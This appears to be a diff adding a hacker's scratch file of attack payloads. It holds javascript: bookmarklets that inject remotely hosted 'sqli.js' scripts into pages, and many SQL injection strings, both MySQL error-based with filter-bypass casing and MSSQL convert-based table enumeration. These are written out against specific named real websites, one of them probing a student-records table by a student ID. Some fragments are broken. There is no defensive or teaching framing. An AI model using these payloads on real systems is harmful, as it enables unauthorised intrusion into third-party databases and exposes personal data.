@@ -1,0 +1,143 @@
+noscript.allowURLBarJS
+
+
+javascript:src='http://depot.com/file.js';funcname();
+
+javascript:void(function(){alert("Boo");alert("Foo");}());
+
+
+javascript:document.writeln("<script src=\"file:///media/DATA/sqli.js\" type=\"text\/javascript\" language=\"javascript\"><\/script>");
+
+javascript:{{ var e=document.createElement("script"); alert("here");e.src = "file:///media/DATA/sqli.js";e.type="text/javascript"; document.getElementsByTagName("head")[0].appendChild(e);}}
+
+
+javascript:var js=document.createElement('script');js.id='wtf';js.type='text/javascript';js.src='file://localhost/C:/Users/unknow/Desktop/json.js';document.getElementsByTagName("body").appendChild(js);callback(data){alert(data)};
+
+
+javascript:$doc ="<script type='text/javascript' src='file:///media/DATA/sqli.js'></script>";
+
+$doc = new DomDocument;
+$doc->loadHTML($doc);
+
+var scripts = document.getElementsByTagName("script");
+var script = scripts[ scripts.length - 1 ].innerHTML;
+if ( script ) {
+  jQuery(document).ready(function(){
+    jQuery.globalEval( script );
+  });
+}
+
+
+
+
+javascript:void(function(){var%20js=document.createElement('script');js.type='text/javascript';js.src='http://www.blu-ray.com.vn/tmp/images/sqli.js';document.head.appendChild(js);}());
+
+javascript:void(function(){var%20js=document.createElement('script');js.type='text/javascript';js.src='http://www.vnmark.vn/templates/gallery/sqli.js';document.head.appendChild(js);}());
+
+http://thptgialoc.edu.vn/tgl/vn/portal/InfoDetail.jsp?area=117&cat=2121&ID=1066 /*!And (Select 1 From(Select Count(*),Concat(SQLI,floor(rAnd(0)*2))x From Information_Schema.Tables Group By x)a)*/-- -
+
+http://minifarm.vinaphone.com.vn/index.php?action=news&cat=33&id=1664800 /*!And (SelSelectect 1 From(SelSelectect Count(*),Concat(SQLI,floor(rAnd(0)*2))x From Information_Schema.Tables Group By x)a)*/-- -
+
+
+
+
+
+
+"(SELeCT+cOncat(0x2353514c23,(select unhex(hex(group_concat(sChEma_nAme))) from (SELeCT sChEma_nAme FrOm infOrmaTion_sChEma.schEmAtA limit 0,1) as t),0x234c515323))"
+
+---==================================
+"("+SQL[VTM['bypass']]['select']+s+SQL[VTM['bypass']]['concat']+"("+t2h(['start'])+",("++SQL[VTM['bypass']]['unhex(hex']+"(("+
+
+select group_concat(sChEma_nAme) from (SELeCT sChEma_nAme FrOm infOrmaTion_sChEma.schEmAtA limit 0,1) as t
+
++"))))+","+t2h(['start'])+"))";
+
+======================
+var injectdbs = "("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['concat']+"("+t2h(['start'])+",("+SQL[VTM['bypass']]['unhex(hex']+"(("+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['group_concat']+"(C)"+SQL['space']+SQL[VTM['bypass']]['from']+SQL['space']+"("+
+
+SQL[VTM['bypass']]['select']+SQL['space']+SQL[VTM['bypass']]['table_name']+SQL['space']+SQL[VTM['bypass']]['as']+SQL['space']+"C"+SQL[VTM['bypass']]['from']+SQL[VTM['bypass']]['information_schema']+"."+SQL[VTM['bypass']]['tables']+SQL[VTM['bypass']]['where']+SQL['space']+SQL[VTM['bypass']]['table_schema']+"="+t2h(dbname)+ 
+
+SQL['space']+SQL[VTM['bypass']]['limit']+count+","+SQL['limit']+")"+SQL[VTM['bypass']]['as']+"T"+")))),"+t2h(['stop'])+"))";
+
+===========================================================
+sql server 
+===========================================================
+SELECT TOP 10 * FROM (SELECT TOP 20 * FROM table ORDER BY BY field ASC)a ORDER BY field DESC;
+
+
+
+
+SELECT * FROM (SELECT *,ROW_NUMBER() OVER (ORDER BY name) as row FROM sys.databases)a WHERE row > 5 and row <= 10
+
+
+
+
+
+
+http://dulichthanhnien-ytc.com.vn/Home/NewsEvent.aspx?id=71 and 1=convert(int,(select top 1 table_name from information_schema.tables));--
+
+
+SELECT top 1 table_name FROM (SELECT *,ROW_NUMBER() OVER (ORDER BY table_name) as row FROM information_schema.tables)a WHERE row > 5 and row <= 10
+
+
+http://dulichthanhnien-ytc.com.vn/Home/NewsEvent.aspx?id=71 and 1=convert(int,(SELECT table_name FROM (SELECT *,ROW_NUMBER() OVER (ORDER BY table_name) as row FROM information_schema.tables)a WHERE row=5));--
+
+
+begin DECLARE @x varchar(8000) SELECT @x = COALESCE(@x+', ','')+ISNULL(table_name,'') FROM information_schema.tables SELECT convert(int,@x) end;--
+
+
+
+begin declare @temp varchar(8000) set @temp='' select @temp=@temp+TenHocPhan+'/' from KQHocTap_TinChi where MaSV in('09085121') select @temp as id into test end--sp_password
+
+
+begin declare @result varchar(8000) set @result = '' select @result = @result + cast(table_name as varchar(8000))+ ' ' from information_schema.tables select rtrim(@result) end;--
+
+
+http://dulichthanhnien-ytc.com.vn/Home/NewsEvent.aspx?id=71;begin declare @r varchar(8000) set @r = '' select @r=@r%2bcast(table_name as varchar(8000))%2b',' from information_schema.tables select convert(int,rtrim(@r)) end;--
+
+
+
+;begin declare @r varchar(8000) set @r = '' select @r=@r%2bcast(c as varchar(8000))%2b',' from information_schema.tables select convert(int,rtrim(@r)) end;--
+
+
+
+http://dulichthanhnien-ytc.com.vn/Home/NewsEvent.aspx?id=71;begin declare @r varchar(8000) set @r=0x7c SELECT TOP 10 @r=@r%2bcast(table_name as varchar(8000))%2b',' FROM (SELECT TOP 20 table_name FROM table ORDER BY table_name ASC)a ORDER BY table_name DESC select convert(int,rtrim(@r)) end;--sp_password
+
+
+
+
+SELECT TOP 10 @r=@r%2bcast(table_name as varchar(8000))%2b',' FROM (SELECT TOP 20 table_name FROM table ORDER BY table_name ASC)a ORDER BY table_name DESC
+
+
+
+
+http://dulichthanhnien-ytc.com.vn/Home/NewsEvent.aspx?id=71;begin declare @r varchar(8000) set @r=0x7c SELECT TOP 15 @r=@r%2bcast(table_name as varchar(8000))%2b',' FROM (SELECT TOP 20 table_name FROM information_schema.tables ORDER BY table_name ASC)a ORDER BY table_name DESC select convert(int,rtrim(@r))b end;--sp_password
+
+=======
+
+http://vieclam.fpt.net/OnlineRecruit1/Default.aspx?ProvinceID=4&RecruitCourseID=1134&RecruitPositionID=1494;begin declare @r varchar(8000) set @r=0x7c SELECT TOP 15 @r=@r%2bcast(table_name as varchar(8000))%2b',' FROM (SELECT TOP 20 table_name FROM information_schema.tables ORDER BY table_name ASC)a ORDER BY table_name DESC select convert(int,rtrim(@r))b end;--sp_password
+
+
+http://vieclam.fpt.net/OnlineRecruit1/Default.aspx?ProvinceID=4&RecruitCourseID=1134&RecruitPositionID=1494;begin declare @r varchar(8000) set @r=0x2353514c23 SELECT TOP 10 @r=@r+cast(schema_name as varchar(8000))+',' FROM information_schema.schemata WHERE information_schema.schemata NOT IN(SELECT TOP 10 information_schema.schemata FROM information_schema.schemata ORDER BY information_schema.schemata) select @r=@r+cast(0x234c515323 as varchar(8000)) select convert(int,rtrim(@r))b end;--sp_password
+
+
+SELECT TOP 10 @r=@r+cast(schema_name as varchar(8000))+',' FROM information_schema.schemata WHERE information_schema.schemata NOT IN(SELECT TOP 10 information_schema.schemata FROM information_schema.schemata ORDER BY information_schema.schemata)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
